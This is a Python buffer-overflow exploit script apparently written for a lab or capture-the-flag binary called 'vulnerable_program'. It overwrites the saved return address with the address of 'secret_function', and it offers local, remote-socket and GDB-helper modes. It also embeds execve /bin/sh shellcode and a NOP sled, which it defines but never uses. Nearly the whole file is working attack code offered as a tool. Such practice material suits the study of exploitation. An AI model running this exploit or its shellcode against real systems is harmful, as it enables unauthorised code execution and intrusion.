#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import struct
import subprocess
import socket
import sys
import time


def generate_exploit_manually():
    """Manual payload generation"""
    print("[*] Generating exploit payload for buffer overflow")

    # Offset to saved RIP (x64: 72 with saved RBP)
    offset = 72

    # Example secret_function address; in real runs grab dynamically
    secret_addr = 0x4011d6

    shellcode = (
        b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50"
        b"\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89"
        b"\xe7\xb0\x3b\x0f\x05"
    )

    nop_sled = b"\x90" * 32

    payload = b"A" * offset
    payload += struct.pack("<Q", secret_addr)

    print(f"[*] Payload length: {len(payload)} bytes")
    print(f"[*] Return address: 0x{secret_addr:08x}")

    with open("payload.bin", "wb") as f:
        f.write(payload)

    print("[*] Payload saved to payload.bin")
    return payload


def exploit_local():
    """Local exploitation (no pwntools)"""
    print("[*] Starting local exploitation")
    p = subprocess.Popen(
        ["./vulnerable_program"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=False,
    )

    lines = []
    for _ in range(8):
        line = p.stdout.readline()
        if not line:
            break
        lines.append(line)

    for l in lines:
        sys.stdout.buffer.write(l)

    def parse_addr(prefix: str):
        for l in lines:
            if prefix.encode() in l:
                return int(l.strip().split()[-1], 16)
        raise RuntimeError(f"Prefix not found: {prefix}")

    buffer_addr = parse_addr("Address buffer:")
    secret_addr = parse_addr("Address secret_function:")
    print(f"[*] Buffer address: 0x{buffer_addr:016x}")
    print(f"[*] secret_function address: 0x{secret_addr:016x}")

    offset = 72
    payload = b"A" * offset + struct.pack("<Q", secret_addr)

    p.stdin.write(payload + b"\n")
    p.stdin.flush()

    try:
        while True:
            out = p.stdout.read(1)
            if not out:
                break
            sys.stdout.buffer.write(out)
    except KeyboardInterrupt:
        pass


def exploit_remote(host, port):
    """Remote exploitation"""
    print(f"[*] Connecting to {host}:{port}")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    payload = generate_exploit_manually()

    s.send(payload + b"\n")

    response = s.recv(4096)
    print(f"[*] Response: {response}")

    if b"secret_function" in response:
        print("[+] Exploitation likely succeeded!")

    s.close()


def debug_with_gdb():
    """GDB helper"""
    print("[*] Preparing GDB command file")

    gdb_commands = [
        "break *main",
        "run",
        "info proc mappings",
        "disas vulnerable_function",
        "break *vulnerable_function+50",
        "continue",
    ]

    with open("gdb_commands.txt", "w") as f:
        f.write("\n".join(gdb_commands))

    print("[*] GDB commands saved to gdb_commands.txt")
    print("[*] Run: gdb -x gdb_commands.txt vulnerable_program")

if __name__ == "__main__":
    print("=" * 50)
    print("       Buffer Overflow Exploit Tool      ")
    print("=" * 50)

    if len(sys.argv) > 1:
        if sys.argv[1] == "local":
            exploit_local()
        elif sys.argv[1] == "remote" and len(sys.argv) == 4:
            exploit_remote(sys.argv[2], int(sys.argv[3]))
        elif sys.argv[1] == "generate":
            generate_exploit_manually()
        elif sys.argv[1] == "debug":
            debug_with_gdb()
        else:
            print("Usage:")
            print("  ./exploit.py local                # Local exploitation")
            print("  ./exploit.py remote <host> <port> # Remote exploitation")
            print("  ./exploit.py generate             # Generate payload")
            print("  ./exploit.py debug                # Create GDB command file")
    else:
        generate_exploit_manually()
